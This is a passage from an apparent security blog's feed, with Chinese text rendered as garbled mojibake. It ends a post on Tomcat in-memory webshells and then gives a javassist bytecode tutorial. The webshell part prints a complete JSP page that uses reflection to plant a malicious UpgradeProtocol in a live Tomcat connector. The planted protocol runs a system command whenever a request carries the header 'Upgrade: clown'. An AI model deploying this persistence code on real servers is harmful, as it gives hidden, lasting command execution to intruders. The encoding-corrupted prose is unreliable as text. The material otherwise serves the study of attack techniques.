alt="image-20240922212924262"></p><p>è¿™é‡Œèµ°åˆ°çš„æ˜¯çˆ¶ç±»çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å°±æ˜¯è¿”å›ä¸€ä¸ªUpgradeProtocolï¼ŒhttUpgradeProtocolsæ˜¯ä¸€ä¸ªhashMapï¼›è·å–äº†upgradeProtocolä¹‹åï¼Œå®ƒä¸‹é¢è¿˜è°ƒç”¨äº†ä»–çš„acceptæ–¹æ³•</p><p>æ¬¸é‚£è¿™é‡Œå†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†ï¼Œå’Œä¹‹å‰çš„ä¹Ÿå¾ˆç±»ä¼¼</p><p>é¦–å…ˆè¿™ä¸ªUpgradeProtocolæ˜¯ä¸€ä¸ªæ¥å£</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªæ¶æ„çš„UpgradeProtocolçš„å®ç°ç±»ï¼Œæ·»åŠ è¿›æˆ‘ä»¬å‰é¢çš„æåˆ°çš„httpUpgradeProtocolsé‡Œé¢å³å¯</p><p>é‚£ä¹ˆç°åœ¨å°±æ˜¯è¦æ‰¾è¿™ä¸ªhttpUpgradeProtocolsæ€ä¹ˆè·å–ï¼Œè¿™é‡Œå…ˆè·Ÿæ–‡ç« çœ‹çœ‹httpUpgradeProtocolsæ˜¯å“ªé‡Œè¢«èµ‹å€¼çš„</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>åœ¨AbstractHttp11Protocol#initæ–¹æ³•é‡Œé¢å¯¹upgradeProtocolsè¿›è¡Œäº†éå†ï¼Œç„¶åè°ƒç”¨äº†configureUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>ç„¶åè¯¥æ–¹æ³•upgradeProtocolæ·»åŠ åˆ°hashMapä¸­</p><blockquote><p>upgradeProtocolsæ˜¯åœ¨tomcatå¯åŠ¨çš„æ—¶å€™è¿›è¡Œåˆå§‹åŒ–</p></blockquote><h2><span id="å†…å­˜é©¬ç¼–å†™">å†…å­˜é©¬ç¼–å†™</span></h2><p>ç¬¬ä¸€æ­¥å…ˆæ‰¾åˆ°Http11NioProtocolï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<strong>request.request.connector.protocolHandler</strong>ä¸­æ‰¾åˆ°</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>ç„¶åhttpUpgradeProtocolså±æ€§å°±åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åå°„å»è·å–ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹æ²¡æœ‰ç›´æ¥getçš„æ–¹æ³•</p><p>ç¬¬äºŒæ­¥å°±æ˜¯ç¼–å†™æ¶æ„çš„UpgradeProtocoläº†</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.åå°„è·å–httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.æ„é€ æ¶æ„çš„UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.æ·»åŠ è¿›upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®çš„æ—¶å€™å¸¦ä¸Šupgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>æˆåŠŸå¼¹è®¡ç®—å™¨</p><h1><span id="tomcat-executorå†…å­˜é©¬">Tomcat-Executorå†…å­˜é©¬</span></h1><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executorå†…å­˜é©¬çš„å®ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œåˆå¼•ç”¨æ–‡ç« ä¸­connectorçš„ç»“æ„å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connectorå°±åˆ†ä¸ºProtocolHandlerå’ŒAdapterï¼ŒProtocolHandlerå°±ç”¨æ¥å¤„ç†è¯·æ±‚ï¼ŒAdapterå°±æ˜¯connectorå’Œcontainerçš„æ¡¥æ¢ï¼Œç”¨äºå°†å¤„ç†åçš„è¯·æ±‚ä¼ é€’ç»™container</p><p>æœ‰å…³äºProtocolHandlerçš„åˆ†ç±»åœ¨å‰é¢çš„å†…å­˜é©¬ä¹Ÿäº†è§£äº†ä¸€ç‚¹ï¼Œæ–‡ç« ä¸­åˆåšäº†ä¸€ä¸ªå¯¼å›¾æ¥åˆ†ç±»æ›´åŠ æ¸…æ™°ï¼Œä¹Ÿæ”¾ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…¶å®å‰é¢çš„ä¼ ç»Ÿwebåº”ç”¨å†…å­˜é©¬ä¹Ÿæ˜¯tomcatè¿™éƒ¨åˆ†çš„ï¼Œå› ä¸ºå®ƒåŸºäºtomcatè¿›è¡Œåˆ†æä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåˆ«çš„ä¸­é—´ä»¶åº”è¯¥ä¹Ÿæ˜¯æœ‰è¿™äº›åŸºæœ¬ç»„ä»¶çš„ã€‚&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;tomcat-valveå†…å­˜é©¬&quot;&gt;Tomcat-Valveå†…å­˜é©¬&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;val</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>javassistå­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºçœ‹åˆ°åœ¨ç¼©çŸ­payloadçš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ï¼š<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1><span id="javassistä»‹ç»">javassistä»‹ç»</span></h1><p>Javassist æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“.ï¼›å…¶ä¸»è¦ä¼˜ç‚¹åœ¨äºç®€å•å¿«é€Ÿ. ç›´æ¥ä½¿ç”¨ java ç¼–ç çš„å½¢å¼, è€Œä¸éœ€è¦äº†è§£è™šæ‹ŸæœºæŒ‡ä»¤, å°±èƒ½åŠ¨æ€æ”¹å˜ç±»çš„ç»“æ„, æˆ–è€…åŠ¨æ€ç”Ÿæˆç±»ã€‚</p><p>ä½¿ç”¨å‰å¯¼å…¥jaråŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassistä¸­æœ€ä¸ºé‡è¦çš„æ˜¯<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>ä»¥åŠ<code>CtField</code>è¿™å‡ ä¸ªç±».</p><ul><li><code>ClassPool</code>: ä¸€ä¸ªåŸºäº<code>Hashtable</code>å®ç°çš„<code>CtClass</code>å¯¹è±¡å®¹å™¨, å…¶ä¸­é”®æ˜¯ç±»åç§°, å€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡</li><li><code>CtClass</code>: <code>CtClass</code>è¡¨ç¤ºç±», ä¸€ä¸ª<code>CtClass</code>(ç¼–è¯‘æ—¶ç±»)å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ªclassæ–‡ä»¶, è¿™äº›<code>CtClass</code>å¯¹è±¡å¯ä»¥ä»<code>ClassPool</code>è·å¾—</li><li><code>CtMethod</code>: è¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•</li><li><code>CtField</code>: è¡¨ç¤ºç±»ä¸­çš„å­—æ®µ</li><li><code>CtConstructor</code>:å¯è¯»å†™çš„ç±»æ„é€ æ–¹æ³•å¯¹è±¡</li></ul><h1><span id="classpoolç›¸å…³æ–¹æ³•">ClassPoolç›¸å…³æ–¹æ³•</span></h1><ul><li><code>getDefault</code>: è¿”å›é»˜è®¤çš„<code>ClassPool</code>æ˜¯å•ä¾‹æ¨¡å¼çš„ï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„<code>ClassPool</code>ï¼›</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : å°†ä¸€ä¸ª<code>ClassPath</code>åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½® æˆ– æ’å…¥åˆ°èµ·å§‹ä½ç½®ã€‚é€šå¸¸é€šè¿‡è¯¥æ–¹æ³•å†™å…¥é¢å¤–çš„ç±»æœç´¢è·¯å¾„ï¼Œä»¥è§£å†³å¤šä¸ªç±»åŠ è½½å™¨ç¯å¢ƒä¸­æ‰¾ä¸åˆ°ç±»çš„å°´å°¬ï¼›</li><li><code>toClass</code> : å°†ä¿®æ”¹åçš„<code>CtClass</code>åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ï¼Œ<code>CtClass</code>çš„<code>toClass</code>æ–¹æ³•æ˜¯é€šè¿‡è°ƒç”¨æœ¬æ–¹æ³•å®ç°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„classï¼›</li><li><code>get</code> , <code>getCtClass</code>: æ ¹æ®ç±»è·¯å¾„åè·å–è¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡ï¼Œç”¨äºåç»­çš„ç¼–è¾‘ã€‚</li></ul><p>ClassPoolå¯¹è±¡çš„åˆ›å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–ClassPoolå¯¹è±¡, ä½¿ç”¨ç³»ç»Ÿé»˜è®¤ç±»è·¯å¾„</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// æ•ˆæœä¸ new ClassPool(true) ä¸€è‡´ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯é»˜è®¤çš„å•ä¾‹æ¨¡å¼</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>ä¸ºå‡å°‘ClassPoolå¯èƒ½å¯¼è‡´çš„å†…å­˜æ¶ˆè€—ï¼› å¯ä»¥ä»ClassPoolä¸­åˆ é™¤ä¸å¿…è¦çš„CtClasså¯¹è±¡. æˆ–è€…æ¯æ¬¡åˆ›å»ºæ–°çš„ClassPoolå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä»ClassPoolä¸­åˆ é™¤CtClasså¯¹è±¡</span><br>ctClass.detach();<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥æ¯æ¬¡åˆ›å»ºä¸€ä¸ªæ–°çš„ClassPool, è€Œä¸æ˜¯ClassPool.getDefault(), é¿å…å†…å­˜æº¢å‡º</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1><span id="ctclassç›¸å…³æ–¹æ³•">CtClassç›¸å…³æ–¹æ³•</span></h1><ul><li>freeze: å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ï¼›</li><li>isFrozen : åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ï¼›</li><li>prune : åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ï¼›</li><li>defrost : è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ï¼›</li><li>detach : å°†è¯¥classä»ClassPoolä¸­åˆ é™¤ï¼›</li><li>writeFile : æ ¹æ®CtClassç”Ÿæˆ .class æ–‡ä»¶ï¼›</li><li>toClass : é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥CtClassã€‚</li><li>setInterfaces: æ·»åŠ çˆ¶æ¥å£</li><li>setSuperclass: æ·»åŠ çˆ¶ç±»</li></ul><h2><span id="è·å–ctclass">è·å–CtClass</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//æœªè·å–åˆ°ç±»æˆ–æŠ›å¼‚å¸¸</span><br><span class="hljs-comment">// é€šè¿‡ç±»åè·å– CtClass, æœªæ‰¾åˆ°è¿”å› null, ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//å†»ç»“ç±»ï¼Œå³ä¸èƒ½ä¿®æ”¹</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å†»ç»“ï¼Œå³ä¸å¯ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><h2><span id="åˆ›å»ºctclass">åˆ›å»ºCtClass</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å¤åˆ¶ä¸€ä¸ªç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// é€šè¿‡classæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç±»ç„¶åå†™å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åˆ›å»ºæ–°ç±»å¹¶å†™å…¥</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>ç„¶åå°±ä¼šæ ¹æ®åç§°ä¿å­˜åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œå°†ç±»æŒä¹…åŒ–äº†åˆ°æ–‡ä»¶ä¸­</p><h2><span id="ctclassåŸºç¡€ä¿¡æ¯">CtClassåŸºç¡€ä¿¡æ¯</span></h2><p>å°±æ˜¯ä¸€äº›ç±»çš„å„ç§åŸºç¡€ä¿¡æ¯ï¼Œç±»å…¨åã€ç±»æ–¹æ³•ã€ç±»å­—æ®µç­‰</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç±»å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// ç±»å…¨å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// åŒ…å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// æ¥å£</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// ç»§æ‰¿ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// è·å–ç±»æ–¹æ³•</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// è·å–ç±»å­—æ®µ</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// åˆ¤æ–­æ•°ç»„ç±»å‹</span><br>ctClass.isArray();<br><span class="hljs-comment">// åˆ¤æ–­åŸç”Ÿç±»å‹</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// åˆ¤æ–­æ¥å£ç±»å‹</span><br>ctClass.isInterface();<br><span class="hljs-comment">// åˆ¤æ–­æšä¸¾ç±»å‹</span><br>ctClass.isEnum();<br><span class="hljs-comment">// åˆ¤æ–­æ³¨è§£ç±»å‹</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹</span><br>ctClass.freeze () <br><span class="hljs-comment">// åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨</span><br>ctClass.prune() <br><span class="hljs-comment">//è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨pruneæ–¹æ³•</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2><span id="å¯¹ctclassè¿›è¡Œæ“ä½œ">å¯¹CtClassè¿›è¡Œæ“ä½œ</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ·»åŠ æ¥å£</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// æ·»åŠ æ„é€ å™¨</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// æ·»åŠ å­—æ®µ</span><br>ctClass.addField(...);<br><span class="hljs-comment">// æ·»åŠ æ–¹æ³•</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2><span id="ctclassç¼–è¯‘">CtClassç¼–è¯‘</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–å­—èŠ‚ç æ–‡ä»¶ éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 